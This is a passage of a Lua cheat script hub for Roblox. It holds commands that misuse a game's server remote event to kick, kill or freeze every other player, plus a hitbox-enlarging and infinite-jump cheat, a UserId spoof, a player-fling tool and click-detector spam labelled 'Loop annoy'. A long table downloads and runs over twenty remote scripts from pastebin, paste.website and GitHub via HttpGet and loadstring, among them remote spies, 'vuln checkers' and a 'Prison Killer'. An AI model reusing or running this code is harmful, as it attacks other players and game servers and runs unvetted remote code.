	game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(mouse.Target.Parent:FindFirstChild("Head"):WaitForChild("Neck"))
	end
	end)
	tool.Parent = game:GetService("Players").LocalPlayer.Backpack
end)

CreateScript("Kick Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v,nil)
			end
		end
	end
end)

CreateScript("Punish Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character,nil)
			end
		end
	end
end)

CreateScript("Walkless Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character.HumanoidRootPart,nil)
			end
		end
	end
end)

CreateScript("Kill Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character:WaitForChild("Head"):WaitForChild("Neck"),nil)
			end
		end
	end
end)

CreateScript("HitBox & Infjump",function()
local InfiniteJumpEnabled = true game:GetService("UserInputService").JumpRequest:connect(function() if InfiniteJumpEnabled then game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping") end end)
game.Players.LocalPlayer.UserId = "2205774994"
_G.HeadSize = 20 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.HumanoidRootPart.Transparency = 0.7 v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue") v.Character.HumanoidRootPart.Material = "Neon" v.Character.HumanoidRootPart.CanCollide = false end) end end end end)
end)

CreateScript("Arabic Admin Room",function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-589.1566772460938, -34.270896911621094, 241.41119384765625))
end)

CreateScript("Arabic Spawn Point",function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-592.3201293945312, 52.972572326660156, 164.14683532714844))
end)

CreateScript("Package Plugins",function()
CreateCMD("lray",function()
-- Red Hyper Laser Gun
game:GetService("Players").LocalPlayer.Character:WaitForChild("Hyperlasergun",0.1):WaitForChild("ServerControl",0.1):InvokeServer("Click",true,game:GetService("Players")[Player.Value].Character.Head.Position)
end)
CreateCMD("ray",function()
-- Black Hole Gear
game:GetService("Players").LocalPlayer.Character:WaitForChild("Gravity Inducer").WeaponEvent:FireServer("Fire",game:GetService("Players")[Player.Value].Character.Head.Position)
end)
end)

--// AutomaticBlox
local scripts = {
	["RobloxHacks"] = game:HttpGet("https://paste.website/p/1ca2aab2-5999-46d8-b9d1-39eb4a442eb9.txt"),
	["LazyHub"] = game:HttpGet("https://paste.website/p/28c3971b-674d-42c3-afd2-1af396eeddd1.txt"),
	["Hydroxide Spy"] = game:HttpGet("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ui/modules/RemoteSpy.lua"),
	["Mr Spy V2"] = game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/Roblox-Script/main/mrspy%20v2.txt"),
	["Mr Spy V1"] = game:HttpGet("https://pastebin.com/raw/bbYeT7z5"),
	["Remote2Script Spy"] = game:HttpGet("https://raw.githubusercontent.com/ou1z/Roblox-Scripts/master/Remote2Script.lua"),
	["Simple Spy"] = game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"),
	["0fiiz Vuln Checker"] = game:HttpGet("https://paste.website/p/deacbe63-7727-4a6c-add9-3be90e15002e.txt"),
	["Kosovo Vuln Checker"] = game:HttpGet("https://paste.website/p/e29ced8a-952e-4e59-9cb3-d15651694f3b.txt"),
	["Prison Commands"] = game:HttpGet("https://pastebin.com/raw/1RvgFtcx"),
	["Prison Killer"] = game:HttpGet("https://paste.website/p/2e644f91-e064-49e0-972d-07476acd31c3.txt"),
	["Prison Ware"] = game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"),
	["illremember Shattervast Admin"] = game:HttpGet("https://pastebin.com/raw/iL4NRDux"),
	["illremember Reviz Admin"] = game:HttpGet("https://pastebin.com/raw/Caniwq2N"),
	["illremember OPFinality Hub"] = game:HttpGet("https://pastebin.com/raw/T5Y2zbyT"),
	["illremember Animation Hub"] = game:HttpGet("https://pastebin.com/raw/0MLPL32f"),
	["Google Script Hub"] = game:HttpGet("https://pastebin.com/raw/JcNAaJvZ"),
	["Swim Hub"] = game:HttpGet("https://raw.githubusercontent.com/SwimPaste/swimhack/main/swimloader_ui.lua"),
	["V.G Hub"] = game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"),
	["VHub (keys)"] = game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/Created/VHub"),
	["Fanmade Synapse Hub"] = game:HttpGet("https://paste.website/p/49cb753f-6618-4e2a-a23d-be5723a5b7b3.txt"),
	["ClickTweens"] = game:HttpGet("https://paste.website/p/72bec212-54ea-4050-9d71-a0476981e69f.txt"),
	["Erased Admin"] = game:HttpGet("https://paste.website/p/7d6deca7-b380-4bc0-98cb-46695e073fba.txt"),
}

for i,v in pairs(scripts) do
	CreateScript(i,function()
	loadstring(v)() -- not made by kosovo this time
	end)
end

--// Initalizing
count = 0
for i,v in pairs(ScrollingFrame:GetChildren()) do
if v:IsA("TextButton") then
count = count + 1
end
end
fourmula = math.floor(count / 3) - 7.5
ScrollingFrame.CanvasSize = UDim2.new(0,0,fourmula,0)
end)
AddCmd('Stigma','',function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local Li = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Main2 = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local Orbit = Instance.new("ImageLabel")
local Ring = Instance.new("ImageLabel")
local UICorner_2 = Instance.new("UICorner")

--Properties:

Li.Name = "Li"
Li.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Li.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Li.DisplayOrder = 999
Li.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = Li
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BackgroundTransparency = 1.000
Main.Position = UDim2.new(0.0103510749, 0, 0.860321403, 0)
Main.Size = UDim2.new(0, 91, 0, 92)

Main2.Name = "Main2"
Main2.Parent = Main
Main2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main2.BackgroundTransparency = 1.000
Main2.Position = UDim2.new(-0.0169143677, 0, 0.097826086, 0)
Main2.Size = UDim2.new(0, 91, 0, 88)
Main2.ZIndex = 3
Main2.Image = "http://www.roblox.com/asset/?id=7102117818"
Main2.SliceScale = 3.000

UICorner.CornerRadius = UDim.new(0.5, 0)
UICorner.Parent = Main2

Orbit.Name = "Orbit"
Orbit.Parent = Main
Orbit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Orbit.BackgroundTransparency = 1.000
Orbit.BorderSizePixel = 4
Orbit.Position = UDim2.new(0.074000001, 0, 0, 15)
Orbit.Size = UDim2.new(0, 12, 0, 12)
Orbit.ZIndex = 2
Orbit.Image = "rbxassetid://7101990169"
Orbit.ImageColor3 = Color3.fromRGB(96, 112, 255)
Orbit.ImageTransparency = 0.200
Orbit.ScaleType = Enum.ScaleType.Fit
Orbit.SliceScale = 4.000

Ring.Name = "Ring"
Ring.Parent = Main
Ring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Ring.BackgroundTransparency = 1.000
Ring.Position = UDim2.new(-0.0169143677, 0, 0.097826086, 0)
Ring.Size = UDim2.new(0, 91, 0, 88)
Ring.Image = "http://www.roblox.com/asset/?id=7102118272"
Ring.SliceScale = 3.000

UICorner_2.CornerRadius = UDim.new(0.5, 0)
UICorner_2.Parent = Ring

-- Scripts:

local function RJKE_fake_script() -- Li.LocalScript 
	local script = Instance.new('LocalScript', Li)

	
	local Main2 = script.Parent.Main.Main2
	local Orbit = script.Parent.Main.Orbit
	local Ring = script.Parent.Main.Ring
	local Main = script.Parent.Main
	--Notice: This relies on the fact it will be a perfectly round icon.
	local RS = game:GetService("RunService").Heartbeat
	local Tween = game:GetService("TweenService")
	local WaitTime = 0.25
	local LoadInfo = TweenInfo.new(WaitTime,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0)
	local FlashInfo = TweenInfo.new(WaitTime,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,1,true,0)
	local hk = Main.AbsoluteSize.X/2
	local MainSize = Main.AbsoluteSize.X
	local ls = Orbit.AbsoluteSize.X/2
	local r = hk
	local theta = 0
	local step = (2*math.pi)/450
	local rotvel = 0.35
	local StepInstance = Instance.new("NumberValue")
	local RotInstance = Instance.new("NumberValue")
	StepInstance.Changed:Connect(function()
		step = StepInstance.Value
	end)
	RotInstance.Changed:Connect(function()
		rotvel = RotInstance.Value
	end)
	
	local Modes = {
		--Main Image--
		Tween:Create(Main2,LoadInfo,{ImageTransparency=0.5}), --Indicates script loading
		Tween:Create(Main2,LoadInfo,{ImageTransparency=1}),   --Indicated script completed
		Tween:Create(Main2,FlashInfo,{ImageTransparency=0}),   --Pulse effect for completed
		--Step Tween--
		Tween:Create(StepInstance,LoadInfo,{Value=(2*math.pi)/180}),
		Tween:Create(StepInstance,LoadInfo,{Value=(2*math.pi)/450}),
		--Rot Tween--
		Tween:Create(RotInstance,LoadInfo,{Value=1}),
		Tween:Create(RotInstance,LoadInfo,{Value=0.35}),
	}
	Modes[2].Completed:Connect(function()
		Modes[3]:Play()
	end)
	
	local function ScriptLoading()
		Modes[6]:Play()
		Modes[4]:Play()
		Modes[1]:Play()
	end
	
	local function ScriptDone()
		Modes[2]:Play()
		Modes[5]:Play()
		Modes[7]:Play()
	end
	spawn(function()
		local deb = false
		local hi = script.Parent.Main
		hi:TweenPosition(UDim2.new(0.5, -50,0.5, -50), Enum.EasingDirection.In)
		wait'3'
		hi:TweenPosition(UDim2.new(0, 12,1, -115), Enum.EasingDirection.Out)
		game:GetService'Players'.LocalPlayer.Chatted:Connect(function(agg)
			pcall(function()
				if agg == '/e hidemeh' then
					hi.Visible = not hi.Visible
				end
			end)
		end)
	end)
	
		
	while RS:wait() do
		theta = theta < 360 and theta + step or 0
		local x = (hk + r * math.cos(theta) - ls)
		local y = (hk + r * math.sin(theta) - ls)
		Orbit.Position = UDim2.new(x/MainSize,0,y/MainSize,0)
		Ring.Rotation = Ring.Rotation < 360 and Ring.Rotation + rotvel or 0
		RS:wait()
	end
end
coroutine.wrap(RJKE_fake_script)()

end)
AddCmd('Cross','',function()

local Handles = {
    CFrame.new(0, -0.5000010132789612, 0),
CFrame.new(0, -1.5000120401382446, 0),
CFrame.new(0, -2.5000228881835938, 0),
CFrame.new(0, -3.500035047531128, 0),
CFrame.new(0, -4.500043869018555, 0),
CFrame.new(0, -5.500058174133301, 0),
CFrame.new(0, -6.500070095062256, 0),
CFrame.new(0, -7.5000810623168945, 0),
CFrame.new(0, -8.500085830688477, 0),
CFrame.new(0, -9.500186920166016, 0),
CFrame.new(-4, -10.500103950500488, 0),
CFrame.new(-5, -10.500103950500488, 0),
CFrame.new(-6, -10.500103950500488, 0),
CFrame.new(4, -10.500103950500488, 0),
CFrame.new(5, -10.500103950500488, 0),
CFrame.new(6, -10.500103950500488, 0),
CFrame.new(-3, -10.500103950500488, 0),
CFrame.new(-2, -10.500103950500488, 0),
CFrame.new(-1, -10.500103950500488, 0),
CFrame.new(-7, -10.500103950500488, 0),
CFrame.new(-8, -10.500103950500488, 0),
CFrame.new(-9, -10.500103950500488, 0),
CFrame.new(7, -10.500103950500488, 0),
CFrame.new(8, -10.500103950500488, 0),
CFrame.new(9, -10.500103950500488, 0),
CFrame.new(10, -10.500103950500488, 0),
CFrame.new(-10, -10.500103950500488, 0),
CFrame.new(0, -10.500103950500488, 0),
CFrame.new(0, -11.500125885009766, 0),
CFrame.new(3, -10.500171661376953, 0),
CFrame.new(2, -10.500171661376953, 0),
CFrame.new(1, -10.500171661376953, 0),
CFrame.new(0, -12.500140190124512, 0),
CFrame.new(0, -13.500151634216309, 0),
CFrame.new(0, -14.500162124633789, 0),
CFrame.new(0, -16.500162124633789, 0),
CFrame.new(0, -17.500162124633789, 0),
CFrame.new(0, -18.500162124633789, 0),
CFrame.new(0, -19.500162124633789, 0),
CFrame.new(0, -20.500162124633789, 0),
CFrame.new(0, 0, 0),
CFrame.new(0, -0.1, 0),
CFrame.new(0, -0.2, 0),
CFrame.new(0, 1.500162124633789, 0),
CFrame.new(0, 2.500162124633789, 0),
CFrame.new(0, 3.500162124633789, 0),
CFrame.new(0, 4.500162124633789, 0),
CFrame.new(0, -15.500162124633789, 0)
}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
end
end 
end)
AddCmd('Flinggui','',function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local LNIO = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Frame_2 = Instance.new("ImageLabel")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")
local TextLabel_Roundify_4px = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")

--Properties:

LNIO.Name = "LNIO"
LNIO.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LNIO.ResetOnSpawn = false

Frame.Parent = LNIO
Frame.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
Frame.Position = UDim2.new(0.0909621269, 0, 0.724954009, 0)
Frame.Size = UDim2.new(0, 253, 0, 131)

UICorner.CornerRadius = UDim.new(0.0329999998, 0)
UICorner.Parent = Frame

Frame_2.Name = "Frame"
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BackgroundTransparency = 1.000
Frame_2.Position = UDim2.new(0.0164696015, 0, 0.198294833, 0)
Frame_2.Size = UDim2.new(0, 243, 0, 97)
Frame_2.Image = "rbxassetid://3570695787"
Frame_2.ImageColor3 = Color3.fromRGB(89, 89, 89)
Frame_2.ScaleType = Enum.ScaleType.Slice
Frame_2.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_2.SliceScale = 0.040

TextBox.Parent = Frame_2
TextBox.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
TextBox.BorderColor3 = Color3.fromRGB(95, 95, 95)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.00940770283, 0, 0.10783276, 0)
TextBox.Size = UDim2.new(0, 238, 0, 33)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderColor3 = Color3.fromRGB(71, 71, 71)
TextBox.PlaceholderText = "USERNAME"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(71, 71, 71)
TextBox.TextSize = 14.000

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
TextButton.BorderColor3 = Color3.fromRGB(95, 95, 95)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.00899999961, 0, 0.530680418, 0)
TextButton.Size = UDim2.new(0, 238, 0, 33)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Fling"
TextButton.TextColor3 = Color3.fromRGB(71, 71, 71)
TextButton.TextSize = 14.000

TextLabel_Roundify_4px.Name = "TextLabel_Roundify_4px"
TextLabel_Roundify_4px.Parent = Frame
TextLabel_Roundify_4px.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_Roundify_4px.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_Roundify_4px.BackgroundTransparency = 1.000
TextLabel_Roundify_4px.Position = UDim2.new(0.5, 0, 0.0760131106, 0)
TextLabel_Roundify_4px.Size = UDim2.new(1.00000024, 0, 0.161416322, 0)
TextLabel_Roundify_4px.Image = "rbxassetid://3570695787"
TextLabel_Roundify_4px.ImageColor3 = Color3.fromRGB(85, 85, 85)
TextLabel_Roundify_4px.ScaleType = Enum.ScaleType.Slice
TextLabel_Roundify_4px.SliceCenter = Rect.new(100, 100, 100, 100)
TextLabel_Roundify_4px.SliceScale = 0.040

TextLabel.Parent = TextLabel_Roundify_4px
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.010642671, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 249, 0, 19)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "notfun paided"
TextLabel.TextColor3 = Color3.fromRGB(168, 168, 168)
TextLabel.TextScaled = true
TextLabel.TextSize = 27.000
TextLabel.TextWrapped = true
local lp = game:FindService("Players").LocalPlayer

local function gplr(String)
	local Found = {}
	local strl = String:lower()
	if strl == "all" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			table.insert(Found,v)
		end
	elseif strl == "others" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name ~= lp.Name then
				table.insert(Found,v)
			end
		end 
	elseif strl == "me" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name == lp.Name then
				table.insert(Found,v)
			end
		end 
	else
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name:lower():sub(1, #String) == String:lower() then
				table.insert(Found,v)
			end
		end 
	end
	return Found 
end
	
-- Scripts:

local function ZSKKSTF_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		local textbox = script.Parent.Parent.TextBox.Text
	local Target = gplr(script.Parent.Parent.TextBox.Text)
	if Target[1] then
		Target = Target[1]
		
		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
		Thrust.Force = Vector3.new(80939,250,1919)
		Thrust.Name = "YeetForce"
		repeat
		lp.Character.HumanoidRootPart.CFrame = Target.Character["Left Leg"].CFrame
		wait()
			lp.Character.HumanoidRootPart.CFrame = Target.Character["Left Leg"].CFrame * CFrame.new(0,-2.5,0)
						lp.Character["Left Arm"].CFrame = Target.Character["Head"].CFrame * CFrame.new(-2,0,2)
			
			Thrust.Location = Target.Character["Left Leg"].Position
			game:FindService("RunService").Heartbeat:wait()
		until not Target.Character:FindFirstChild("Head")
	else
		notif("Invalid player")
	end
	end)
end
coroutine.wrap(ZSKKSTF_fake_script)()
local function ETTDOR_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0.50
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(ETTDOR_fake_script)()

end)
AddCmd('R6','',function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua", true))()
end)
AddCmd('Sword','',function()
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

bind = "e" -- has to be lowercase

mouse.KeyDown:connect(function(key)
if key == bind then
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://522635514"
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
k:Play()
repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
k:Stop()
anim:Destroy()
end
end)
local Handles = {
    CFrame.new(0, -1, 0),
    CFrame.new(0, 0, 0),
        CFrame.new(0, -1, 0),
        CFrame.new(0, -2, 0),
        CFrame.new(0, -3, 0),
        CFrame.new(0, -3.5, 0),
    CFrame.new(0, 0, 0),
    CFrame.new(0.65, -1, 0),
    CFrame.new(-0.65, -1, 0),

    
}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2  then


v.Grip = Handles[i-1] * CFrame.Angles(0,math.rad(90),0)
v.Parent = game.Players.LocalPlayer.Character
end
end 
wait(0.5)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	
			if (v:IsA("Tool")) and v.ClassName == "Script" then

				v.Script:Destroy()
				
			end
end

end)
-- Bar handling
AddCmd('cartridegui','',function()
local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Shaman.lua'))()
local Flags = Library.Flags

local Window = Library:Window({
    Text = "silly ahh cart ride"
})

--[Tabs]--

local CombatTab = Window:Tab({
    Text = "Carts"
})



--[Section Creation]--

local AimlockSection = CombatTab:Section({
    Text = "CartRide"
})
local AimlockSection2 = CombatTab:Section({
    Text = "CartRide Extra"
})
local CombatTab1 = Window:Tab({
    Text = "Misc"
})



--[Section Creation]--

local AimlockSection3 = CombatTab1:Section({
    Text = "Needs/Wants"
})

AimlockSection:Slider({
    Text = "Speed",
    Default = 1,
    Minimum = 0,
    Maximum = 200,
    Flag = "SliderFlag",
    Callback = function(v)
for i =1,v do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Up" then
 fireclickdetector(part.Click)
 end
 end
 end
    end
})
AimlockSection:Slider({
    Text = "Lower Speed",
    Default = 1,
    Minimum = 0,
    Maximum = 200,
    Flag = "SliderFlag",
    Callback = function(v)
for i =1,v do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Down" then
 fireclickdetector(part.Click)
 end
 end
 end
    end
})
AimlockSection:Button({
    Text = "Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Click To Regen Cart" then
 fireclickdetector(part.Head.Click)

 end
 end
end
})
loopon = true
AimlockSection:Button({
    Text = "Loop Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
    while loopon do
    
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Click To Regen Cart"  then
 fireclickdetector(part.Head.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection:Button({
    Text = "UnLoop Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
loopon = false
end
})
AimlockSection:Button({
    Text = "Turn on/off all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "On" then
 fireclickdetector(part.Click)
 end
 end
end
})
loopon1 = true
loopon2 = true
loopon3 = true
AimlockSection:Button({
    Text = "Loop annoy",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon1 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "On" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection:Button({
    Text = "UnLoop annoy",
    Tooltip = "nothing silly!",
    Callback = function()
loopon1 = false
end
})
AimlockSection2:Button({
    Text = "Loop speed up",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon2 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Up" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection2:Button({
    Text = "UnLoop speed up",
    Tooltip = "nothing silly!",
    Callback = function()
loopon2 = false
end
})
AimlockSection2:Button({
    Text = "Loop backwards",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon3 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Down" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection2:Button({
    Text = "UnLoop backwards",
    Tooltip = "nothing silly!",
    Callback = function()
loopon3 = false
end
})
--new tabsbbb

end)

AddCmd('CartRideGui','',function()
local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Shaman.lua'))()
local Flags = Library.Flags

local Window = Library:Window({
    Text = "silly ahh cart ride"
})

--[Tabs]--

local CombatTab = Window:Tab({
    Text = "Carts"
})



--[Section Creation]--

local AimlockSection = CombatTab:Section({
    Text = "CartRide"
})
local AimlockSection2 = CombatTab:Section({
    Text = "CartRide Extra"
})
local CombatTab1 = Window:Tab({
    Text = "Misc"
})



--[Section Creation]--

local AimlockSection3 = CombatTab1:Section({
    Text = "Needs/Wants"
})

AimlockSection:Slider({
    Text = "Speed",
    Default = 1,
    Minimum = 0,
    Maximum = 200,
    Flag = "SliderFlag",
    Callback = function(v)
for i =1,v do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Up" then
 fireclickdetector(part.Click)
 end
 end
 end
    end
})
AimlockSection:Slider({
    Text = "Lower Speed",
    Default = 1,
    Minimum = 0,
    Maximum = 200,
    Flag = "SliderFlag",
    Callback = function(v)
for i =1,v do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Down" then
 fireclickdetector(part.Click)
 end
 end
 end
    end
})
AimlockSection:Button({
    Text = "Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Click To Regen Cart" then
 fireclickdetector(part.Head.Click)

 end
 end
end
})
loopon = true
AimlockSection:Button({
    Text = "Loop Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
    while loopon do
    
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Click To Regen Cart"  then
 fireclickdetector(part.Head.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection:Button({
    Text = "UnLoop Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
loopon = false
end
})
AimlockSection:Button({
    Text = "Turn on/off all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "On" then
 fireclickdetector(part.Click)
 end
 end
end
})
loopon1 = true
loopon2 = true
loopon3 = true
AimlockSection:Button({
    Text = "Loop annoy",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon1 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "On" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection:Button({
    Text = "UnLoop annoy",
    Tooltip = "nothing silly!",
    Callback = function()
loopon1 = false
end
})
AimlockSection2:Button({
    Text = "Loop speed up",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon2 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Up" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection2:Button({
    Text = "UnLoop speed up",
    Tooltip = "nothing silly!",
    Callback = function()
loopon2 = false
end
})
AimlockSection2:Button({
    Text = "Loop backwards",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon3 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Down" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection2:Button({
    Text = "UnLoop backwards",
    Tooltip = "nothing silly!",
    Callback = function()
loopon3 = false
end
})
--new tabsbbb


end)
LPLR:GetMouse().KeyDown:Connect(function(k)
if k == ';' then
Bar.Visible = true

Bar:CaptureFocus()
wait()
Bar.Text = ""
end
end)
Bar.FocusLost:Connect(function(enter)
if enter == true then
Bar.Visible = false

if CMDS[Bar.Text] then
CMDS[Bar.Text]()
end
Bar.Text = ""
end
end)

-- Text stuff
Match = function(name,str) return name:lower():find(str:lower()) and true end
function CIndex(Text)
local Index,SizeY = 0,0



end
CIndex('')
Bar:GetPropertyChangedSignal("Text"):Connect(function()
CIndex(Bar.Text)
end)
--Stuff
while wait() do
if SEIZURE then
LPLR.Character.HumanoidRootPart.Massless = true
wait()
LPLR.Character.HumanoidRootPart.Massless = false
wait()
end
end






















































































































































































 end
}

Tab:Button{
	Name = "Prison life admin",
	Description = nil,
	Callback = function() local CmdGui = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local CmdName = Instance.new("TextLabel")
local FindCmd = Instance.new("TextBox")
local CmdHandler = Instance.new("ScrollingFrame")
local CmdText = Instance.new("TextButton")
local UIListLayout = Instance.new("UIListLayout")
local Background2 = Instance.new("Frame")
local Label = Instance.new("TextLabel")
local Execute = Instance.new("TextBox")
local Minimum = Instance.new("TextButton")
local Close = Instance.new("TextButton")
local Background3 = Instance.new("Frame")
